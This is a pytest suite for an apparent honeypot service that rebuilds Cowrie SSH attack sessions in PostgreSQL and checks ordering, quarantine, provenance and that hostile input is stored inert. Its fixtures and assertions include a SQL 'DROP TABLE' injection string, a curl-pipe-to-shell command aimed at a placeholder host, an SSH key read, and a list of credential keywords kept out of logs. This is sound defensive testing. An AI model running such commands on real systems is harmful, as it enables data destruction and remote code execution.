"""P4 promotion and reconstruction on real PostgreSQL (FR-005, FR-005b, FR-006, FR-048).

Covers the approved engineering decisions (ARCHITECTURE.md ADR-024):
D1 order, D2 close-only trigger, D3 late events, D4 one behavior per phase,
D5 deterministic identifiers, D6 connect-owned network fields, D7 text
mapping; plus provenance, idempotency, atomicity, bounds, hostile input and
the mandatory fresh-database determinism check.
"""

from __future__ import annotations

import json
import logging
from pathlib import Path
from typing import Any

import psycopg
import pytest

from aitl_common.logging import JsonFormatter
from intel_service import identity
from intel_service.promotion import (
    INVALID_PAYLOAD,
    LATE_EVENT,
    SESSION_TOO_LARGE,
    Promoter,
    PromotionBoundError,
    PromotionLimits,
)
from intel_service.sessions import CONFLICTING_FIELD, NO_CONNECT_EVENT
from tests.fixtures import honeypot_corpus
from tests.fixtures.cowrie_events import cowrie_line, load_phase_rules
from tests.fixtures.staging import (
    ingest_corpus,
    projection,
    promoter,
    role_engine,
    stage,
    stage_with_ids,
)
from tests.pg_harness import Cluster

S1 = "a1b2c3d4e5f60001"
S2 = "a1b2c3d4e5f60002"
EXPECTED_CORPUS_PHASES = {
    "0ba5e000e0f00001": ["scanning", "credential_probing", "unclassified"],
    "a1b0c0d0e0f00001": [
        "scanning",
        "credential_probing",
        "credential_file_access",
        "unclassified",
    ],
    "a2b0c0d0e0f00001": [
        "scanning",
        "credential_probing",
        "discovery",
        "credential_file_access",
        "exfiltration_attempt",
        "unclassified",
    ],
    "a3b0c0d0e0f00001": [
        "scanning",
        "credential_probing",
        "discovery",
        "collection",
        "exfiltration_attempt",
        "ingress_transfer",
        "unclassified",
    ],
    "b0f0c0d0e0f00001": ["scanning", "credential_probing", "unclassified"],
    "b0f0c0d0e0f00002": ["scanning", "credential_probing", "unclassified"],
    # "cd /tmp && wget ..." starts with `cd`: P4 does not shell-parse compound commands.
    "ba1d0000e0f00001": [
        "scanning",
        "credential_probing",
        "unclassified",
        "ingress_transfer",
        "execution",
    ],
    "d15c0000e0f00001": ["scanning", "credential_probing", "discovery", "unclassified"],
}


def ts(second: int) -> str:
    return f"2025-03-01T10:00:{second:02d}.000000Z"


def session_lines(session: str = S1, *, close: bool = True, **connect: Any) -> list[bytes]:
    lines = [
        cowrie_line("cowrie.session.connect", session=session, timestamp=ts(0), **connect),
        cowrie_line("cowrie.login.success", session=session, timestamp=ts(1)),
        cowrie_line("cowrie.command.input", session=session, timestamp=ts(2), input="uname -a"),
    ]
    if close:
        lines.append(cowrie_line("cowrie.session.closed", session=session, timestamp=ts(3)))
    return lines


@pytest.fixture
def db(pg: Cluster, fresh_db: str) -> str:
    pg.upgrade(fresh_db)
    return fresh_db


@pytest.fixture
def corpus_db(pg: Cluster, db: str, tmp_path: Path) -> str:
    ingest_corpus(pg, db, tmp_path)
    return db


def rows(pg: Cluster, dbname: str, sql: str, params: tuple[Any, ...] = ()) -> list[tuple[Any, ...]]:
    with pg.admin(dbname) as conn:
        return [tuple(r) for r in conn.execute(sql, params).fetchall()]


# --- corpus ---------------------------------------------------------------------------------------


def test_corpus_reconstruction(pg: Cluster, corpus_db: str) -> None:
    result = promoter(pg, corpus_db).run()
    assert (result.sessions_promoted, result.pending_sessions, result.failed_sessions) == (8, 1, 0)
    assert not result.quarantined
    phases: dict[str, list[str]] = {}
    for session, phase in rows(
        pg,
        corpus_db,
        "SELECT s.cowrie_session_id, b.phase::text FROM intel.attacker_behavior b "
        "JOIN intel.attack_session s ON s.id = b.session_id "
        "ORDER BY s.cowrie_session_id, b.ordinal",
    ):
        phases.setdefault(session, []).append(phase)
    assert phases == EXPECTED_CORPUS_PHASES


def test_every_closed_session_event_is_promoted_and_linked(pg: Cluster, corpus_db: str) -> None:
    """FR-006 no event loss: each promoted event is linked to at least one behavior."""
    promoter(pg, corpus_db).run()
    unlinked = rows(
        pg,
        corpus_db,
        "SELECT e.id FROM intel.attack_event e WHERE NOT EXISTS "
        "(SELECT 1 FROM intel.behavior_event l WHERE l.event_id = e.id)",
    )
    assert unlinked == []
    per_session = dict(
        rows(
            pg,
            corpus_db,
            "SELECT s.cowrie_session_id, count(*) FROM intel.attack_event e "
            "JOIN intel.attack_session s ON s.id = e.session_id GROUP BY 1",
        )
    )
    assert per_session["a2b0c0d0e0f00001"] == len(honeypot_corpus._ar2_key_theft())
    assert per_session["b0f0c0d0e0f00001"] == len(honeypot_corpus._brute_force_only()) // 2


def test_corpus_sessions_are_synthetic_and_live_ones_honeypot(
    pg: Cluster, db: str, tmp_path: Path
) -> None:
    logs = tmp_path / "live"
    logs.mkdir()
    (logs / "cowrie.json").write_bytes(honeypot_corpus.render()["ar1_cloud_credentials.json"])
    ingest_corpus(pg, db, tmp_path, source=logs, mode="live")
    ingest_corpus(pg, db, tmp_path)  # the same session ID, as fixture data
    promoter(pg, db).run()
    labels = rows(
        pg,
        db,
        "SELECT source_type::text, count(*) FROM intel.attack_session GROUP BY 1 ORDER BY 1",
    )
    assert labels == [("honeypot", 1), ("synthetic", 8)]


# --- mandatory determinism ------------------------------------------------------------------------


def test_fresh_databases_reconstruct_identically_including_ids(
    pg: Cluster, db: str, tmp_path: Path
) -> None:
    ingest_corpus(pg, db, tmp_path)
    promoter(pg, db).run()
    first = projection(pg, db)
    for table in ("sessions", "events", "behaviors", "links"):
        assert first[table], table
    other = f"{db}_b"
    pg.create_database(other)
    try:
        pg.upgrade(other)
        ingest_corpus(pg, other, tmp_path)
        promoter(pg, other).run()
        assert projection(pg, other) == first
    finally:
        pg.drop_database(other)
    # The identifiers are the D5 derivations, not database-generated values.
    for session_uuid, source_type, cowrie_session_id, *_ in first["sessions"]:
        assert session_uuid == str(identity.session_id(source_type, cowrie_session_id))


def test_file_creation_order_does_not_matter(pg: Cluster, db: str, tmp_path: Path) -> None:
    forward = tmp_path / "forward"
    reverse = tmp_path / "reverse"
    forward.mkdir()
    reverse.mkdir()
    rendered = honeypot_corpus.render()
    for name in sorted(rendered):
        (forward / name).write_bytes(rendered[name])
    for name in sorted(rendered, reverse=True):
        (reverse / name).write_bytes(rendered[name])
    ingest_corpus(pg, db, tmp_path, source=forward)
    promoter(pg, db).run()
    other = f"{db}_r"
    pg.create_database(other)
    try:
        pg.upgrade(other)
        ingest_corpus(pg, other, tmp_path, source=reverse)
        promoter(pg, other).run()
        assert projection(pg, other) == projection(pg, db)
    finally:
        pg.drop_database(other)


# --- D1 ordering ----------------------------------------------------------------------------------


def test_identical_timestamps_order_by_raw_record_id_not_physical_order(
    pg: Cluster, db: str
) -> None:
    same = ts(5)
    lines = {
        10: cowrie_line("cowrie.session.connect", session=S1, timestamp=ts(0)),
        30: cowrie_line("cowrie.command.input", session=S1, timestamp=same, input="zzz"),
        20: cowrie_line("cowrie.command.input", session=S1, timestamp=same, input="aaa"),
        40: cowrie_line("cowrie.session.closed", session=S1, timestamp=ts(9)),
    }
    stage_with_ids(pg, db, [(i, lines[i]) for i in (40, 30, 10, 20)])  # scrambled physically
    promoter(pg, db).run()
    assert rows(pg, db, "SELECT raw_record_id, seq FROM intel.attack_event ORDER BY seq") == [
        (10, 1),
        (20, 2),
        (30, 3),
        (40, 4),
    ]


def test_physical_insertion_order_does_not_change_the_reconstruction(pg: Cluster, db: str) -> None:
    pairs = list(enumerate(session_lines(), start=1)) + list(enumerate(session_lines(S2), start=11))
    stage_with_ids(pg, db, pairs)
    promoter(pg, db).run()
    other = f"{db}_p"
    pg.create_database(other)
    try:
        pg.upgrade(other)
        stage_with_ids(pg, other, list(reversed(pairs)))
        promoter(pg, other).run()
        assert projection(pg, other) == projection(pg, db)
    finally:
        pg.drop_database(other)


def test_out_of_order_ingestion_is_ordered_by_time(pg: Cluster, db: str) -> None:
    lines = session_lines()
    stage(pg, db, [lines[3], lines[2], lines[0], lines[1]])  # close ingested first
    promoter(pg, db).run()
    assert [
        r[0] for r in rows(pg, db, "SELECT event_type::text FROM intel.attack_event ORDER BY seq")
    ] == ["session_connect", "login_success", "command_input", "session_closed"]


# --- D2 completion --------------------------------------------------------------------------------


def test_open_session_stays_pending_and_closing_promotes_it(pg: Cluster, db: str) -> None:
    stage(pg, db, session_lines(close=False))
    first = promoter(pg, db).run()
    assert (first.sessions_promoted, first.pending_sessions, first.pending_events) == (0, 1, 3)
    assert rows(pg, db, "SELECT count(*) FROM intel.attack_session") == [(0,)]
    stage(pg, db, [cowrie_line("cowrie.session.closed", session=S1, timestamp=ts(3))])
    second = promoter(pg, db).run()
    assert (second.sessions_promoted, second.events_promoted, second.pending_sessions) == (1, 4, 0)


def test_repeated_promotion_is_idempotent(pg: Cluster, corpus_db: str) -> None:
    promoter(pg, corpus_db).run()
    before = projection(pg, corpus_db)
    again = promoter(pg, corpus_db).run()
    assert (again.sessions_promoted, again.events_promoted) == (0, 0)
    assert projection(pg, corpus_db) == before


# --- D3 late events -------------------------------------------------------------------------------


def test_late_event_is_quarantined_and_history_is_unchanged(pg: Cluster, db: str) -> None:
    stage(pg, db, session_lines())
    promoter(pg, db).run()
    before = projection(pg, db)
    late = cowrie_line("cowrie.command.input", session=S1, timestamp=ts(1), input="cat ~/.ssh/k")
    (late_id,) = stage(pg, db, [late])[-1:]
    result = promoter(pg, db).run()
    assert result.quarantined == {LATE_EVENT: 1}
    after = projection(pg, db)
    for table in ("sessions", "events", "behaviors", "links"):
        assert after[table] == before[table], table
    assert [(q[1], q[2]) for q in after["quarantine"]] == [(LATE_EVENT, late_id)]


# --- D6 session fields ----------------------------------------------------------------------------


def test_connect_event_owns_the_network_fields(pg: Cluster, db: str) -> None:
    ids = stage(pg, db, session_lines(src_port=51022))
    promoter(pg, db).run()
    session = rows(
        pg,
        db,
        "SELECT host(src_ip), src_port, first_event_at, first_raw_record_id "
        "FROM intel.attack_session",
    )
    assert session[0][:2] == ("203.0.113.7", 51022)
    assert session[0][3] == ids[0]


@pytest.mark.parametrize(
    ("mutate", "reason"),
    [
        (lambda ls: ls[1:], NO_CONNECT_EVENT),
        (
            lambda ls: [
                *ls,
                cowrie_line("cowrie.session.connect", session=S1, timestamp=ts(4), src_port=9),
            ],
            CONFLICTING_FIELD,
        ),
        (
            lambda ls: [
                *ls,
                cowrie_line(
                    "cowrie.command.input", session=S1, timestamp=ts(2), src_ip="198.51.100.5"
                ),
            ],
            CONFLICTING_FIELD,
        ),
    ],
    ids=["missing-connect", "second-connect", "conflicting-src-ip"],
)
def test_invalid_sessions_are_quarantined_whole(
    pg: Cluster, db: str, mutate: Any, reason: str
) -> None:
    ids = stage(pg, db, mutate(session_lines()))
    result = promoter(pg, db).run()
    assert result.quarantined == {reason: len(ids)}
    assert rows(pg, db, "SELECT count(*) FROM intel.attack_session") == [(0,)]
    assert rows(
        pg,
        db,
        "SELECT raw_record_id FROM intel_raw.quarantine_record WHERE stage = 'promotion' "
        "ORDER BY raw_record_id",
    ) == [(i,) for i in ids]
    # Evidence is preserved, never rewritten or dropped.
    assert rows(pg, db, "SELECT count(*) FROM intel_raw.raw_ingest_record") == [(len(ids),)]


# --- quarantine, bounds, atomicity ----------------------------------------------------------------


def test_payload_that_fails_revalidation_is_quarantined(pg: Cluster, db: str) -> None:
    """Staging is untrusted even after P3: re-validation runs again (Principle 19)."""
    (bad,) = stage(pg, db, [b'{"eventid": "cowrie.command.input", "x": 1}'])
    result = promoter(pg, db).run()
    assert result.quarantined == {INVALID_PAYLOAD: 1}
    ((payload,),) = rows(
        pg, db, "SELECT payload FROM intel_raw.quarantine_record WHERE raw_record_id = %s", (bad,)
    )
    assert json.loads(payload) == {
        "detail": "event.invalid_session",
        "raw_record_id": bad,
        "reason": INVALID_PAYLOAD,
    }


def test_oversized_session_is_quarantined(pg: Cluster, db: str) -> None:
    ids = stage(pg, db, session_lines())
    result = promoter(pg, db, PromotionLimits(max_session_events=3)).run()
    assert result.quarantined == {SESSION_TOO_LARGE: len(ids)}


def test_unhandled_bound_fails_closed_before_writing(pg: Cluster, db: str) -> None:
    stage(pg, db, session_lines() + session_lines(S2))
    with pytest.raises(PromotionBoundError):
        promoter(pg, db, PromotionLimits(max_unhandled_events=5, page_size=2)).run()
    assert projection(pg, db) == {
        "sessions": [],
        "events": [],
        "behaviors": [],
        "links": [],
        "quarantine": [],
    }


def test_a_failed_session_leaves_no_partial_rows_and_retries(
    pg: Cluster, db: str, monkeypatch: pytest.MonkeyPatch
) -> None:
    stage(pg, db, session_lines())
    original = Promoter._write

    def fail_after_events(connection: Any, plan: Any) -> None:
        original(connection, plan)
        raise RuntimeError("process interrupted")

    monkeypatch.setattr(Promoter, "_write", staticmethod(fail_after_events))
    assert promoter(pg, db).run().failed_sessions == 1
    assert rows(pg, db, "SELECT count(*) FROM intel.attack_event") == [(0,)]
    assert rows(pg, db, "SELECT count(*) FROM intel.attack_session") == [(0,)]
    monkeypatch.setattr(Promoter, "_write", staticmethod(original))
    assert promoter(pg, db).run().sessions_promoted == 1


# --- provenance -----------------------------------------------------------------------------------


def test_provenance_both_directions(pg: Cluster, corpus_db: str) -> None:
    promoter(pg, corpus_db).run()
    chain = rows(
        pg,
        corpus_db,
        "SELECT b.phase::text, e.seq, s.cowrie_session_id, s.source_type::text, r.id, "
        "r.ingest_mode::text "
        "FROM intel.attacker_behavior b "
        "JOIN intel.behavior_event l ON l.behavior_id = b.id "
        "JOIN intel.attack_event e ON e.id = l.event_id AND e.session_id = b.session_id "
        "JOIN intel.attack_session s ON s.id = e.session_id "
        "JOIN intel_raw.raw_ingest_record r ON r.id = e.raw_record_id "
        "WHERE b.phase = 'exfiltration_attempt' ORDER BY s.cowrie_session_id",
    )
    assert [(c[0], c[2], c[3], c[5]) for c in chain] == [
        ("exfiltration_attempt", "a2b0c0d0e0f00001", "synthetic", "fixture"),
        ("exfiltration_attempt", "a3b0c0d0e0f00001", "synthetic", "fixture"),
    ]
    # Reverse: raw record -> event -> behaviors.
    raw_id = chain[0][4]
    back = rows(
        pg,
        corpus_db,
        "SELECT b.phase::text FROM intel.attack_event e "
        "JOIN intel.behavior_event l ON l.event_id = e.id "
        "JOIN intel.attacker_behavior b ON b.id = l.behavior_id WHERE e.raw_record_id = %s",
        (raw_id,),
    )
    assert back == [("exfiltration_attempt",)]


@pytest.mark.parametrize(
    "statement",
    [
        "INSERT INTO intel.attacker_behavior (session_id, ordinal, phase, phase_rules_version, "
        "started_at, ended_at) VALUES (gen_random_uuid(), 1, 'discovery', 'phase-rules-v1', "
        "now(), now())",
        "INSERT INTO intel.behavior_event (behavior_id, event_id, session_id) "
        "VALUES (gen_random_uuid(), gen_random_uuid(), gen_random_uuid())",
        "INSERT INTO intel.attack_event (session_id, raw_record_id, seq, event_type, occurred_at, "
        "raw_text, normalized_text, truncated) VALUES (gen_random_uuid(), 1, 1, 'other', now(), "
        "'', '', false)",
    ],
)
def test_orphan_rows_are_rejected_by_foreign_keys(pg: Cluster, db: str, statement: str) -> None:
    """A behavior, link or event without its source cannot exist (NOT NULL FKs)."""
    with pg.connect(db, "intel_svc") as conn, pytest.raises(psycopg.errors.ForeignKeyViolation):
        conn.execute(statement)


@pytest.mark.parametrize(
    "statement",
    [
        "UPDATE intel.attack_event SET seq = seq + 100",
        "DELETE FROM intel.attacker_behavior",
        "UPDATE intel.attack_session SET source_type = 'honeypot'",
        "DELETE FROM intel.behavior_event",
    ],
)
def test_reconstruction_is_append_only_for_its_writer(
    pg: Cluster, corpus_db: str, statement: str
) -> None:
    promoter(pg, corpus_db).run()
    with (
        pg.connect(corpus_db, "intel_svc") as conn,
        pytest.raises(psycopg.errors.InsufficientPrivilege),
    ):
        conn.execute(statement)


def test_promotion_refuses_any_role_but_intel_svc(pg: Cluster, db: str) -> None:
    engine = role_engine(pg, db, "ingest_writer")
    try:
        with pytest.raises(PermissionError):
            Promoter(engine, load_phase_rules())
    finally:
        engine.dispose()


# --- hostile input and logging --------------------------------------------------------------------


def test_hostile_session_is_stored_inert(pg: Cluster, corpus_db: str) -> None:
    promoter(pg, corpus_db).run()
    texts = [
        r[0]
        for r in rows(
            pg,
            corpus_db,
            "SELECT e.raw_text FROM intel.attack_event e JOIN intel.attack_session s "
            "ON s.id = e.session_id WHERE s.cowrie_session_id = '0ba5e000e0f00001' "
            "AND e.event_type = 'command_input' ORDER BY e.seq",
        )
    ]
    assert "'; DROP TABLE intel_raw.raw_ingest_record; --" in texts
    assert "$(curl -s http://198.51.100.9/p | sh)" in texts
    assert rows(pg, corpus_db, "SELECT count(*) > 0 FROM intel_raw.raw_ingest_record") == [(True,)]
    nul = [t for t in texts if t.endswith("nul-escaped")]
    assert nul == ["\ufffdnul-escaped"]  # U+0000 is not storable: replaced, and flagged as evidence
    escaped = rows(
        pg,
        corpus_db,
        "SELECT e.raw_text, e.normalized_text FROM intel.attack_event e "
        "WHERE e.raw_text LIKE '%%' || chr(27) || '%%'",
    )
    assert escaped == [("\x1b[2J\x1b[31mred\x1b[0m", "red")]  # ANSI escapes removed


def test_logs_carry_counts_and_correlation_only(
    pg: Cluster, corpus_db: str, caplog: pytest.LogCaptureFixture
) -> None:
    with caplog.at_level(logging.DEBUG, logger="intel_service"):
        promoter(pg, corpus_db).run()
    documents = [json.loads(JsonFormatter().format(r)) for r in caplog.records]
    runs = [d for d in documents if d.get("event") == "promotion.run"]
    assert len(runs) == 1
    assert runs[0]["correlation_id"]
    assert runs[0]["fields"]["sessions_promoted"] == 8
    rendered = json.dumps(documents)
    for forbidden in ("toor", "id_rsa", "DROP TABLE", "203.0.113", "a2b0c0d0e0f00001", "uname"):
        assert forbidden not in rendered, forbidden


def test_phase_tie_break_order_is_the_database_enum(pg: Cluster, db: str) -> None:
    from intel_service.reconstruction import PHASE_ORDER

    ((labels,),) = rows(pg, db, "SELECT enum_range(NULL::public.behavior_phase)::text[]")
    assert tuple(labels) == PHASE_ORDER
